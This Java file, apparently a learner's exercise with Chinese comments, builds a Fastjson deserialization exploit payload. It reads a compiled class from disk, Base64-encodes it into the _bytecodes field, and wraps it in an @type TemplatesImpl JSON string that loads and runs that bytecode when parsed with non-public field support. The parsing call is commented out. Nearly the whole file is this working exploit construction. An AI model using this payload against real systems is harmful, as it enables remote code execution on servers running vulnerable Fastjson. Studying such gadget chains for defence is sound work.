package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class FastJsonTest3 {
    public static void main(String[] args) throws Exception {
        // TemplatesImpl 该链在前面已经看过了
        // getOutputProperties 满足get的条件，所以能够调用
        //
        byte[] bytes = classBytes();
        String enc = Base64.getEncoder().encodeToString(bytes);
        System.out.print(enc);
        String s = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"Mechoy\",\"_tfactory\":{},\"_bytecodes\":[\"" + enc + "\"],\"OutputProperties\":null}";

        // 因为_name _tfactory _bytecodes 都是私有属性，所以需要增加 Feature.SupportNonPublicField
        // Feature.SupportNonPublicField:看名字都知道，支持非公共字段
//        JSON.parseObject(s, Feature.SupportNonPublicField);
    }

    public static byte[] classBytes() throws IOException {
        // 注意路径
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
